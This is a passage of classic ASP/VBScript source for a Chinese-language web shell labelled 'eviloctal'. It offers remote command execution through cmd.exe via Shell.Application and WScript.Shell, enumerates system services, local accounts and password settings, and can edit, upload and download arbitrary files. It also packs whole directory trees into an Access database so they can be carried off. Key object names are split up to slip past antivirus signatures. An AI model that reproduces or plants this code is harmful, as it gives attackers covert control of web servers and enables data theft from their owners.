		echo "BY TTFCT<hr/>"
	End Sub

	Sub PageSaCmdRun()
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, thePath, theAct, appPath, appName, appArgs
		
		showTitle("She"&T&"ll.Appl"&T&"ication命令行操作")
		
		theAct = Trim(Request("theAct"))
		appPath = Trim(Request("appPath"))
		thePath = Trim(Request("thePath"))
		appName = Trim(Request("appName"))
		appArgs = Trim(Request("appArgs"))

		If theAct = "doAct" Then
			If appName = "" Then
				appName = "cmd.exe"
			End If
		
			If appPath <> "" And Right(appPath, 1) <> "\" Then
				appPath = appPath & "\"
			End If
		
			If LCase(appName) = "cmd.exe" And appArgs <> "" Then
				If LCase(Left(appArgs, 2)) <> "/c" Then
					appArgs = "/c " & appArgs
				End If
			Else
				If LCase(appName) = "cmd.exe" And appArgs = "" Then
					appArgs = "/c "
				End If
			End If
			
			saX.ShellExecute appName, appArgs, appPath, "", 0
			chkErr(Err)
		End If
		
		If theAct = "readResult" Then
			Err.Clear
			echo encode(streamLoadFromFile(aspPath))
			If Err Then
				Set theFile = fsoX.OpenTextFile(aspPath)
				echo encode(theFile.ReadAll())
				Set theFile = Nothing
			End If
			Response.End
		End If
		
		echo "<style>body{margin:8;border:none;background-color:buttonface;}</style>"
		echo "<body onload=""document.forms[0].appArgs.focus();setTimeout('weviloctaloadIFrame();', 3900);"">"
		echo "<form method=post onSubmit='this.Submit.disabled=true'>"
		echo "<input type=hidden name=theAct value=doAct>"
		echo "<input type=hidden name=aspPath value=""" & HtmlEncode(aspPath) & """>"
		echo "所在路径: <input name=appPath type=text id=appPath value=""" & HtmlEncode(appPath) & """ size=62><br/>"
		echo "程序文件: <input name=appName type=text id=appName value=""" & HtmlEncode(appName) & """ size=62> "
		echo "<input type=button name=Submit4 value=' 回显 ' onClick=""this.form.appArgs.value+=' > '+this.form.aspPath.value;""><br/> "
		echo "命令参数: <input name=appArgs type=text id=appArgs value=""" & HtmlEncode(appArgs) & """ size=62> "
		echo "<input type=submit name=Submit value=' 运行 '><br/>"
		echo "<hr/>注: 只有命令行程序在CMD.EXE运行环境下才可以进行临时文件回显(利用"">""符号),其它程序只能执行不能回显.<br/>"
		echo "　&nbsp; 由于命令执行时间同网页刷新时间不同步,所以有些执行时间长的程序结果需要手动刷新下面的iframe才能得到.回显后记得删除临时文件.<hr/>"
		echo "<iframe id=cmdResult style='width:100%;height:78%;'>"
		echo "</iframe>"
		echo "</form>"
		echo "</body>"
	End Sub

	Sub PageServiceList()
		Dim sa, objService, objComputer
		
		showTitle("系统服务信息查看")
		Set objComputer = GetObject("WinNT://.")
		Set sa = Server.CreateObject("She"&T&"ll.Appl"&T&"ication")
		objComputer.Filter = Array("Service")
		
		echo "<ol>"
		If isDebugMode = False Then
			On Error Resume Next
		End If
		For Each objService In objComputer
			echo "<li>" & objService.Name & "</li><hr/>"
			echo "<ol>服务名称: " & objService.Name & "<br/>"
			echo "显示名称: " & objService.DisplayName & "<br/>"
			echo "启动类型: " & getStartType(objService.StartType) & "<br/>"
			echo "运行状态: " & sa.IsServiceRunning(objService.Name) & "<br/>"
'			echo "当前状态: " & objService.Status & "<br/>"
'			echo "服务类型: " & objService.ServiceType & "<br/>"
			echo "登录身份: " & objService.ServiceAccountName & "<br/>"
			echo "服务描述: " & getServiceDsc(objService.Name) & "<br/>"
			echo "文件路径及参数: " & objService.Path
			echo "</ol><hr/>"
		Next
		echo "</ol><hr/>"
		
		Set sa = Nothing
	End Sub
	
	Function getServiceDsc(strService)
		Dim ws
		Set ws = Server.CreateObject("WScr"&x&"ipt.Shell")
		getServiceDsc = ws.RegRead("HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\" & strService & "\Description")
		Set ws = Nothing
	End Function

	Sub PageTxtSearcher()
		Response.Buffer = True
		Server.ScriptTimeOut = 5000
		Dim keyword, theAct, thePath, theFolder
		theAct = Request("theAct")
		keyword = Trim(Request("keyword"))
		thePath = Trim(Request("thePath"))
		
		showTitle("文本文件搜索器")
		
		If thePath = "" Then
			thePath = Server.MapPath("\")
		End If
		
		echo "FSO文件搜索:"
		echo "<hr/>"
		echo "<form name=form1 method=post action=?eviloctal=TxtSearcher&theAct=fsoSearch onsubmit=this.Submit.disabled=true>"
		echo "路径: <input name=thePath type=text value=""" & HtmlEncode(thePath) & """ id=thePath size=61><br/>"
		echo "关键字: <input name=keyword type=text value=""" & HtmlEncode(keyword) & """ id=keyword size=60>"
		echo "<input type=submit name=Submit value=给我搜>"
		echo "</form>"
		echo "<hr/>"
		echo "She"&T&"ll.Appl"&T&"ication &amp; Adodb.Stream文件搜索:"
		echo "<hr/>"
		echo "<form name=form1 method=post action=?eviloctal=TxtSearcher&theAct=saSearch onsubmit=this.Submit2.disabled=true>"
		echo "路径: <input name=thePath type=text value=""" & HtmlEncode(thePath) & """ id=thePath size=61><br/>"
		echo "关键字: <input name=keyword type=text value=""" & HtmlEncode(keyword) & """ id=keyword size=60>"
		echo "<input type=submit name=Submit2 value=给我搜>"
		echo "</form>"
		echo "<hr/>"
		
		If theAct = "fsoSearch" And keyword <> "" Then
			Set theFolder = fsoX.GetFolder(thePath)
			Call searchFolder(theFolder, keyword)
			Set theFolder = Nothing
		End If
		
		If theAct = "saSearch" And keyword <> "" Then
			Call appSearchIt(thePath, keyword)
		End If
		
		echo "<hr/>"
	End Sub
	
	Sub searchFolder(folder, str)
		Dim ext, title, theFile, theFolder
		For Each theFile In folder.Files
			ext = LCase(Split(theFile.Path, ".")(UBound(Split(theFile.Path, "."))))
			If InStr(LCase(theFile.Name), LCase(str)) > 0 Then
				echo fileLink(theFile, "")
			End If
			If ext = "asp" Or ext = "asa" Or ext = "cer" Or ext = "cdx" Then
				If searchFile(theFile, str, title, "fso") Then
					echo fileLink(theFile, title)
				End If
			End If
		Next
		Response.Flush()
		For Each theFolder In folder.subFolders
			searchFolder theFolder, str
		Next
	end sub
	
	Function searchFile(f, s, title, method)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, content, pos1, pos2
		
		If method = "fso" Then
			Set theFile = fsoX.OpenTextFile(f.Path)
			content = theFile.ReadAll()
			theFile.Close
			Set theFile = Nothing
		 Else
			content = streamLoadFromFile(f.Path)
		End If
		
		If Err Then
			Err.Clear
			content = ""
		End If
		
		searchFile = InStr(1, content, S, vbTextCompare) > 0 
		If searchFile Then
			pos1 = InStr(1, content, "<TITLE>", vbTextCompare)
			pos2 = InStr(1, content, "</TITLE>", vbTextCompare)
			title = ""
			If pos1 > 0 And pos2 > 0 Then
				title = Mid(content, pos1 + 7, pos2 - pos1 - 7)
			End If
		End If
	End Function
	
	Function fileLink(f, title)
		fileLink = f.Path
		If title = "" Then
			title = f.Name
		End If
		fileLink = "<li><font color=ff0000>" & title & "</font> " & fileLink & "</li>"
	End Function
	
	Sub appSearchIt(thePath, theKey)
		Dim title, extName, objFolder, objItem, fileName
		Set objFolder = saX.NameSpace(thePath)
		
		For Each objItem In objFolder.Items
			If objItem.IsFolder = True Then
				Call appSearchIt(objItem.Path, theKey)
				Response.Flush()
			 Else
				extName = LCase(Split(objItem.Path, ".")(UBound(Split(objItem.Path, "."))))
				fileName = Split(objItem.Path, "\")(UBound(Split(objItem.Path, "\")))
				If InStr(LCase(fileName), LCase(theKey)) > 0 Then
					echo fileLink(objItem, "")
				End If
				If extName = "asp" Or extName = "asa" Or extName = "cer" Or extName = "cdx" Then
					If searchFile(objItem, theKey, title, "application") Then
						echo fileLink(objItem, title)
					End If
				End If
			End If
		Next
	End Sub

	Sub PageUserList()
		Dim objUser, objGroup, objComputer
		
		showTitle("系统用户及用户组信息查看")
		Set objComputer = GetObject("WinNT://.")
		objComputer.Filter = Array("User")
		echo "<a href=javascript:showHideMe(userList);>User:</a>"
		echo "<span id=userList><hr/>"
		For Each objUser in objComputer
			echo "<li>" & objUser.Name & "</li>"
			echo "<ol><hr/>"
			getUserInfo(objUser.Name)
			echo "<hr/></ol>"
		Next
		echo "</span>"
		
		echo "<br/><a href=javascript:showHideMe(userGroupList);>UserGroup:</a>"
		echo "<span id=userGroupList><hr/>"
		objComputer.Filter = Array("Group")
		For Each objGroup in objComputer
			echo "<li>" & objGroup.Name & "</li>"
			echo "<ol><hr/>" & objGroup.Description & "<hr/></ol>"
		Next
		echo "</span><hr/>"

	End Sub
	
	Sub getUserInfo(strUser)
		Dim User, Flags
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set User = GetObject("WinNT://./" & strUser & ",user")
		echo "描述: " & User.Description & "<br/>"
		echo "所属用户组: " & getItsGroup(strUser) & "<br/>"
		echo "密码已过期: " & cbool(User.Get("PasswordExpired")) & "<br/>"
		Flags = User.Get("UserFlags")
		echo "密码永不过期: " & cbool(Flags And &H10000) & "<br/>"
		echo "用户不能更改密码: " & cbool(Flags And &H00040) & "<br/>"
		echo "非全局帐号: " & cbool(Flags And &H100) & "<br/>"
		echo "密码的最小长度: " & User.PasswordMinimumLength & "<br/>"
		echo "是否要求有密码: " & User.PasswordRequired & "<br/>"
		echo "帐号停用中: " & User.AccountDisabled & "<br/>"
		echo "帐号锁定中: " & User.IsAccountLocked & "<br/>"
		echo "用户信息文件: " & User.Profile & "<br/>"
		echo "用户登录脚本: " & User.LoginScript & "<br/>"
		echo "用户Home目录: " & User.HomeDirectory & "<br/>"
		echo "用户Home目录根: " & User.Get("HomeDirDrive") & "<br/>"
		echo "帐号过期时间: " & User.AccountExpirationDate & "<br/>"
		echo "帐号失败登录次数: " & User.BadLoginCount & "<br/>"
		echo "帐号最后登录时间: " & User.LastLogin & "<br/>"
		echo "帐号最后注销时间: " & User.LastLogoff & "<br/>"
		For Each RegTime In User.LoginHours
			If RegTime < 255 Then
				Restrict = True
			End If
		Next
		echo "帐号已用时间: " & Restrict & "<br/>"
		Err.Clear
	End Sub
	
	Function getItsGroup(strUser)
		Dim objUser, objGroup
		Set objUser = GetObject("WinNT://./" & strUser & ",user")
		For Each objGroup in objUser.Groups
			getItsGroup = getItsGroup & " " & objGroup.Name
		Next
	End Function

	Sub PageWsCmdRun()
		Dim cmdStr, cmdPath, cmdResult
		cmdStr = Request("cm"&x&"dStr")
		cmdPath = Request("cmd"&x&"Path")
		
		showTitle("WScri"&T&"pt.She"&T&"ll命令行操作")
		
		If cmdPath = "" Then
			cmdPath = "cm"&x&"d.exe"
		End If
		
		If cmdStr <> "" Then
			If InStr(LCase(cmdPath), "c"&x&"md.exe") > 0 Or InStr(LCase(cmdPath), LCase(myCmdDotExeFile)) > 0 Then
				cmdResult = doWsCmdRun(cmdPath & " /c " & cmdStr)
			 Else
		 		If LCase(cmdPath) = "wscri"&x&"ptshell" Then
					cmdResult = doWsCmdRun(cmdStr)
				 Else
					cmdResult = doWsCmdRun(cmdPath & " " & cmdStr)
				End If
			End If
		End If
		
		echo "<style>body{margin:8;}</style>"
		echo "<body onload=""document.forms[0].cmdStr.focus();document.forms[0].cmdResult.style.height=document.body.clientHeight-115;"">"
		echo "<form method=post onSubmit='this.Submit.disabled=true'>"
		echo "路径: <input name=cmdPath type=text id=cmdPath value=""" & HtmlEncode(cmdPath) & """ size=50> "
		echo "<input type=button name=Submit2 value=使用WScri"&T&"pt.She"&T&"ll onClick=""this.form.cmdPath.value='WScriptShell';""><br/>"
		echo "命令/参数: <input name=cmdStr type=text id=cmdStr value=""" & HtmlEncode(cmdStr) & """ size=62> "
		echo "<input type=submit name=Submit value=' 运行 '><br/>"
		echo "<hr/>注: 请只在这里执行单步程序(程序执行开始到结束不需要人工干预),不然本程序会无法正常工作,并且在服务器生成一个不可结束的进程.<hr/>"
		echo "<textarea id=cmdResult style='width:100%;height:78%;'>"
		echo HtmlEncode(cmdResult)
		echo "</textarea>"
		echo "</form>"
		echo "</body>"
	End Sub
	
	Function doWsCmdRun(cmdStr)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim fso, theFile
		Set fso = Server.CreateObject("Scripting.FileSystemObject")
		
		doWsCmdRun = wsX.Exec(cmdStr).StdOut.ReadAll()
		If Err Then
			echo Err.Description & "<br>"
			Err.Clear
			wsX.Run cmdStr & " > " & aspPath, 0, True
			Set theFile = fso.OpenTextFile(aspPath)
			doWsCmdRun = theFile.RealAll()
			If Err Then
				echo Err.Description & "<br>"
				Err.Clear
				doWsCmdRun = streamLoadFromFile(aspPath)
			End If
		End If
		
		Set fso = Nothing
	End Function
	Sub PageOther()
		echo "<style>"
		echo "A:visited {color: #333333;text-decoration: none;}"
		echo "A:active {color: #333333;text-decoration: none;}"
		echo "A:link {color: #000000;text-decoration: none;}"
		echo "A:hover {color: #333333;text-decoration: none;}"
		echo "BODY {font-size: 9pt;COLOR: #000000;font-family: ""Courier New"";border: none;background-color: buttonface;}"
		echo "textarea {font-family: ""Courier New"";font-size: 12px;border-width: 1px;color: #000000;}"
		echo "table {font-size: 9pt;}"
		echo "form {margin: 0;}"
		echo "#fsoDriveList span{width: 100px;}"
		echo "#FileList span{width: 90;height: 70;cursor: hand;text-align: center;word-break: break-all;border: 1px solid buttonface;}"
		echo ".anotherSpan{color: #ffffff;width: 90;height: 70;text-align: center;background-color: #0A246A;border: 1px solid #0A246A;}"
		echo ".font{font-size: 35px;line-height: 40px;}"
		echo "#fileExplorerTools {background-color: buttonFace;}"
		echo ".input, input {border-width: 1px;}"
		echo "</style>" & vbNewLine
		
		echo "<script language=javascript>" & vbNewLine
		echo "function showHideMe(me){" & vbNewLine
		echo "if(me.innerText == ''){" & vbNewLine
		echo "me.innerText = '\nNo Contents!';" & vbNewLine
		echo "}" & vbNewLine
		echo "if(me.style.display == 'none'){" & vbNewLine
		echo "me.style.display = '';" & vbNewLine
		echo "}else{" & vbNewLine
		echo "me.style.display = 'none';" & vbNewLine
		echo "}" & vbNewLine
		echo "}" & vbNewLine
		echo "function changeMyClass(me){" & vbNewLine
		echo "if(me.className == ''){" & vbNewLine
		echo "if(usePath.value != '')document.getElementById(usePath.value).className = '';" & vbNewLine
		echo "usePath.value = me.id;" & vbNewLine
		echo "status = me.title;" & vbNewLine
		echo "me.className = 'anotherSpan';" & vbNewLine
		echo "}" & vbNewLine
		echo "}" & vbNewLine
		echo "function changeThePath(me){" & vbNewLine
		echo "location.href = '?eviloctal=' + eviloctal.value + '&thePath=' + me.id;" & vbNewLine
		echo "}" & vbNewLine
		echo "function fixTheLayer(strObj){" & vbNewLine
		echo "var objStyle=document.getElementById(strObj).style;" & vbNewLine
		echo "objStyle.width = document.body.clientWidth;" & vbNewLine
		echo "objStyle.top = document.body.scrollTop + 2;" & vbNewLine
		echo "}" & vbNewLine
		echo "function openUrl(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=openUrl&thePath=' + usePath.value);" & vbNewLine
		echo "}" & vbNewLine
		echo "function newOne(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=newOne&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=110,width=300');" & vbNewLine
		echo "}" & vbNewLine
		echo "function editFile(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=showEdit&thePath=' + usePath.value, '', 'menu=no,resizable=yes');" & vbNewLine
		echo "}" & vbNewLine
		echo "function appDoAction(act){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=' + act + '&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function downTheFile(){" & vbNewLine
		echo "if(confirm('如果该文件超过20M,\n建议不要通过流方式下载\n这样会占用服务器大量的资源\n并可能导致服务器死机!\n您可以先把文件复制到当前站点目录下,\n然后通过http协议来下载.\n按\""确定\""用流来进行下载.')){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=downTheFile&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "}" & vbNewLine
		echo "function appDoAction2(act){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=' + act + '&thePath=' + truePath.value, '','menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function appTheAttributes(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=theAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=194,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function appRename(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=rename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function upTheFile(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=showUpload&thePath=' + truePath.value, '', 'menu=no,resizable=yes,height=80,width=380');" & vbNewLine
		echo "}" & vbNewLine
		echo "function weviloctaloadIFrame(){" & vbNewLine
		echo "cmdResult.location.href = '?eviloctal=SaCmdRun&theAct=readResult';" & vbNewLine
		echo "}" & vbNewLine
		echo "function fsoRename(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=showFsoRename&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=20,width=300');" & vbNewLine
		echo "}" & vbNewLine
		echo "function delOne(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=delOne&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=100,width=368');" & vbNewLine
		echo "}" & vbNewLine
		echo "function fsoGetAttributes(){" & vbNewLine
		echo "newWin = window.open('?eviloctal=' + eviloctal.value + '&theAct=getAttributes&thePath=' + usePath.value, '', 'menu=no,resizable=yes,height=170,width=300');" & vbNewLine
		echo "}" & vbNewLine
		echo "</script>"
	End Sub

	Sub openUrl(usePath)
		Dim theUrl, thePath
		
		thePath = Server.MapPath("/")
		
		If LCase(Left(usePath, Len(thePath))) = LCase(thePath) Then
			theUrl = Mid(usePath, Len(thePath) + 1)
			theUrl = Replace(theUrl, "\", "/")
			If Left(theUrl, 1) = "/" Then
				theUrl = Mid(theUrl, 2)
			End If
			Response.Redirect("/" & theUrl)
		 Else
			alertThenClose("您所要打开的文件不在本站点目录下\n您可以尝试把要打开(下载)的文件粘贴到\n站点目录下,然后再打开(下载)!")
			Response.End
		End If
	End Sub
	
	Sub showEdit(thePath, strMethod)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim theFile, unEditableExt
		
		If Right(thePath, 1) = "\" Then
			alertThenClose("编辑文件夹操作是非法的.")
			Response.End
		End If
		
		unEditableExt = "$exe$dll$bmp$wav$mp3$wma$ra$wmv$ram$rm$avi$mgp$png$tiff$gif$pcx$jpg$com$msi$scr$rar$zip$ocx$sys$mdb$"
		
		echo "<style>body{border:none;overflow:hidden;background-color:buttonface;}</style>"
		echo "<body topmargin=9>"
		echo "<form method=post style='margin:0;width:100%;height:100%;'>"
		echo "<textarea name=fileContent style='width:100%;height:90%;'>"
		If strMethod = "stream" Then
			echo HtmlEncode(streamLoadFromFile(thePath))
		 Else
			Set theFile = fsoX.OpenTextFile(thePath, 1)
			echo HtmlEncode(theFile.ReadAll())
			theFile.Close
			Set theFile = Nothing
		End If
		echo "</textarea><hr/>"
		echo "<div align=right>"
		echo "保存为:<input size=30 name=thePath value=""" & HtmlEncode(thePath) & """> "
		echo "<input type=checkbox name='windowStatus' id=windowStatus"
		If Request.Cookies(m & "windowStatus") = "True" Then
			echo " checked"
		End If
		echo "><label for=windowStatus>保存后关闭窗口</label> "
		echo "<input type=submit value=' 保存 '><input type=hidden value='saveFile' name=theAct>"
		echo "<input type=reset value=' 恢复 '>"
		echo "<input type=button value=' 清空 ' onclick=this.form.fileContent.innerText='';>"
		echo strJsCloseMe & "</div>"
		echo "</form>"
		echo "</body><br/>"
		
	End Sub
	
	Sub saveToFile(thePath, strMethod)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim fileContent, windowStatus
		fileContent = Request("fileContent")
		windowStatus = Request("windowStatus")
		
		If strMethod = "stream" Then
			streamSaveToFile thePath, fileContent
			chkErr(Err)
		 Else
			fsoSaveToFile thePath, fileContent
			chkErr(Err)
		End If
		
		If windowStatus = "on" Then
			Response.Cookies(m & "windowStatus") = "True"
			Response.Write "<script>window.close();</script>"
		 Else
			Response.Cookies(m & "windowStatus") = "False"
			Call showEdit(thePath, strMethod)
		End If
	End Sub
	
	Sub fsoSaveToFile(thePath, fileContent)
		Dim theFile
		Set theFile = fsoX.OpenTextFile(thePath, 2, True)
		theFile.Write fileContent
		theFile.Close
		Set theFile = Nothing
	End Sub
	
	Function streamLoadFromFile(thePath)
		Dim stream
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Set stream = Server.CreateObject("adodb.stream")
		With stream
			.Type=2
			.Mode=3
			.Open
			.LoadFromFile thePath
			.LoadFromFile thePath
			If Request("eviloctal") <> "TxtSearcher" Then
				chkErr(Err)
			End If
			.Charset="gb2312"
			.Position=2
			streamLoadFromFile=.ReadText()
			.Close
		End With
		Set stream = Nothing
	End Function
	
	Sub downTheFile(thePath)
		Response.Clear
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim stream, fileName, fileContentType

		fileName = split(thePath,"\")(uBound(split(thePath,"\")))
		Set stream = Server.CreateObject("adodb.stream")
		stream.Open
		stream.Type = 1
		stream.LoadFromFile(thePath)
		chkErr(Err)
		Response.AddHeader "Content-Disposition", "attachment; filename=" & fileName
		Response.AddHeader "Content-Length", stream.Size
		Response.Charset = "UTF-8"
		Response.ContentType = "application/octet-stream"
		Response.BinaryWrite stream.Read 
		Response.Flush
		stream.Close
		Set stream = Nothing
	End Sub
	
	Sub showUpload(thePath, eviloctal)
		echo "<style>body{margin:8;overflow:hidden;}</style>"
		echo "<form method=post enctype='multipart/form-data' action='?eviloctal=" & eviloctal & "&theAct=upload&thePath=" & UrlEncode(thePath) & "' onsubmit='this.Submit.disabled=true;;'>"
		echo "上传文件: <input name=file type=file size=31><br/>保存为: "
		echo "<input name=fileName type=text value=""" & HtmlEncode(thePath) & """ size=33>"
		echo "<input type=checkbox name=writeMode value=True>覆盖模式<hr/>"
		echo "<input name=Submit type=submit id=Submit value='上 传' onClick=""this.form.action+='&fileName='+this.form.fileName.value+'&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;"">"
		echo  strJsCloseMe
		echo "</form>"
	End Sub
	
	Sub streamUpload(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Server.ScriptTimeOut = 5000
		Dim i, j, info, stream, streamT, theFile, fileName, overWrite, fileContent
		theFile = Request("theFile")
		fileName = Request("fileName")
		overWrite = Request("overWrite")

		If InStr(fileName, ":") <= 0 Then
			fileName = thePath & fileName
		End If

		Set stream = Server.CreateObject("adodb.stream")
		Set streamT = Server.CreateObject("adodb.stream")

		With stream
			.Type = 1
			.Mode = 3
			.Open
			.Write Request.BinaryRead(Request.TotalBytes)
			.Position = 0
			fileContent = .Read()
			i = InStrB(fileContent, chrB(13) & chrB(10))
			info = LeftB(fileContent, i - 1)
			i = Len(info) + 2
			i = InStrB(i, fileContent, chrB(13) & chrB(10) & chrB(13) & chrB(10)) + 4 - 1
			j = InStrB(i, fileContent, info) - 1
			streamT.Type = 1
			streamT.Mode = 3
			streamT.Open
			stream.position = i
			.CopyTo streamT, j - i - 2
			If overWrite = "true" Then
				streamT.SaveToFile fileName, 2
			 Else
				streamT.SaveToFile fileName
			End If
			If Err.Number = 3004 Then
				Err.Clear
				fileName = fileName & "\" & Split(theFile, "\")(UBound(Split(theFile ,"\")))
				If overWrite="true" Then
					streamT.SaveToFile fileName, 2
				 Else
					streamT.SaveToFile fileName
				End If
			End If
			chkErr(Err)
			echo("<script language=""javascript"">alert('文件上传成功!\n" & Replace(fileName, "\", "\\") & "');</script>")
			streamT.Close
			.Close
		End With
		
		Set stream = Nothing
		Set streamT = Nothing
	End Sub

	Function getDriveType(num)
		Select Case num
			Case 0
				getDriveType = "未知"
			Case 1
				getDriveType = "可移动磁盘"
			Case 2
				getDriveType = "本地硬盘"
			Case 3
				getDriveType = "网络磁盘"
			Case 4
				getDriveType = "CD-ROM"
			Case 5
				getDriveType = "RAM 磁盘"
		End Select
	End Function

	Function getFileIcon(extName)
		Select Case LCase(extName)
			Case "vbs", "h", "c", "cfg", "pas", "bas", "log", "asp", "txt", "php", "ini", "inc", "htm", "html", "xml", "conf", "config", "jsp", "java", "htt", "lst", "aspx", "php3", "php4", "js", "css", "asa"
				getFileIcon = "Wingdings>2"
			Case "wav", "mp3", "wma", "ra", "wmv", "ram", "rm", "avi", "mpg"
				getFileIcon = "Webdings>·"
			Case "jpg", "bmp", "png", "tiff", "gif", "pcx", "tif"
				getFileIcon = "'webdings'>&#159;"
			Case "exe", "com", "bat", "cmd", "scr", "msi"
				getFileIcon = "Webdings>1"
			Case "sys", "dll", "ocx"
				getFileIcon = "Wingdings>&#255;"
			Case Else
				getFileIcon = "'Wingdings 2'>/"
		End Select
	End Function

	Function getStartType(num)
		Select Case num
			Case 2
				getStartType = "自动"
			Case 3
				getStartType = "手动"
			Case 4
				getStartType = "已禁用"
		End Select
	End Function

	Sub PageAddToMdb()
		Dim theAct, thePath
		theAct = Request("theAct")
		thePath = Request("thePath")
		Server.ScriptTimeOut = 5000

		showTitle("文件夹打包/解开器")

		If theAct = "addToMdb" Then
			addToMdb(thePath)
			alertThenClose("操作完成!")
			Response.End
		End If
		If theAct = "releaseFromMdb" Then
			unPack(thePath)
			alertThenClose("操作完成!")
			Response.End
		End If

		echo "文件夹打包:<br/>"
		echo "<form method=post target=_blank>"
		echo "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & """ size=80>"
		echo "<input type=hidden value=addToMdb name=theAct>"
		echo "<select name=theMethod><option value=fso>FSO</option><option value=app>无FSO</option>"
		echo "</select>"
		echo "<br><input type=submit value='开始打包'>"
		echo "<hr/>注: 打包生成eviloctalTop.mdb文件,位于同级目录下"
		echo "</form>"

		echo "<hr/>文件包解开(需FSO支持):<br/>"
		echo "<form method=post target=_blank>"
		echo "<input name=thePath value=""" & HtmlEncode(Server.MapPath(".")) & "\eviloctalTop.mdb"" size=80>"
		echo "<input type=hidden value=releaseFromMdb name=theAct><input type=submit value='帮我解开'>"
		echo "<hr/>注: 解开来的所有文件都位于同级目录下"
		echo "</form>"


		echo "<hr/>"
	End Sub

	Sub addToMdb(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Dim rs, conn, stream, connStr, adoCatalog
		Set rs = Server.CreateObject("ADODB.RecordSet")
		Set stream = Server.CreateObject("ADODB.Stream")
		Set conn = Server.CreateObject("ADO"&T&"DB.Conne"&T&"ction")
		Set adoCatalog = Server.CreateObject("ADOX.Catalog")
		connStr = "Provider=Microsoft.Jet.OLEDB.4.0; Data Source=" & Server.MapPath("eviloctalTop.mdb")

		adoCatalog.Create connStr
		conn.Open connStr
		conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)")
		
		stream.Open
		stream.Type = 1
		rs.Open "FileData", conn, 3, 3
		
		If Request("theMethod") = "fso" Then
			fsoTreeForMdb thePath, rs, stream
		 Else
			saTreeForMdb thePath, rs, stream
		End If

		rs.Close
		Conn.Close
		stream.Close
		Set rs = Nothing
		Set conn = Nothing
		Set stream = Nothing
		Set adoCatalog = Nothing
	End Sub

	Function fsoTreeForMdb(thePath, rs, stream)
		Dim item, theFolder, folders, files, sysFileList
		sysFileList = "$eviloctalTop.mdb$eviloctalTop.ldb$"
		If fsoX.FolderExists(thePath) = False Then
			showErr(thePath & " 目录不存在或者不允许访问!")
		End If
		Set theFolder = fsoX.GetFolder(thePath)
		Set files = theFolder.Files
		Set folders = theFolder.SubFolders

		For Each item In folders
			fsoTreeForMdb item.Path, rs, stream
		Next

		For Each item In files
			If InStr(sysFileList, "$" & item.Name & "$") <= 0 Then
				rs.AddNew
				rs("thePath") = Mid(item.Path, 4)
				stream.LoadFromFile(item.Path)
				rs("fileContent") = stream.Read()
				rs.Update
			End If
		Next

		Set files = Nothing
		Set folders = Nothing
		Set theFolder = Nothing
	End Function

	Sub unPack(thePath)
		If isDebugMode = False Then
			On Error Resume Next
		End If
		Server.ScriptTimeOut = 5000
		Dim rs, ws, str, conn, stream, connStr, theFolder
		str = Server.MapPath(".") & "\"
		Set rs = CreateObject("ADODB.RecordSet")
		Set stream = CreateObject("ADODB.Stream")
		Set conn = CreateObject("ADO"&T&"DB.Conne"&T&"ction")
		connStr = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=" & thePath & ";"

		conn.Open connStr
		rs.Open "FileData", conn, 1, 1
		stream.Open
		stream.Type = 1

		Do Until rs.Eof
			theFolder = Left(rs("thePath"), InStrRev(rs("thePath"), "\"))
			If fsoX.FolderExists(str & theFolder) = False Then
				createFolder(str & theFolder)
			End If
			stream.SetEos()
			stream.Write rs("fileContent")
			stream.SaveToFile str & rs("thePath"), 2
			rs.MoveNext
		Loop

		rs.Close
		conn.Close
		stream.Close
		Set ws = Nothing
		Set rs = Nothing
		Set stream = Nothing
		Set conn = Nothing
	End Sub

	Sub createFolder(thePath)
		Dim i
		i = Instr(thePath, "\")
		Do While i > 0
			If fsoX.FolderExists(Left(thePath, i)) = False Then
				fsoX.CreateFolder(Left(thePath, i - 1))
			End If
			If InStr(Mid(thePath, i + 1), "\") Then
				i = i + Instr(Mid(thePath, i + 1), "\")
			 Else
				i = 0
			End If
		Loop
	End Sub

	Sub saTreeForMdb(thePath, rs, stream)
		Dim item, theFolder, sysFileList
		sysFileList = "$eviloctalTop.mdb$eviloctalTop.ldb$"
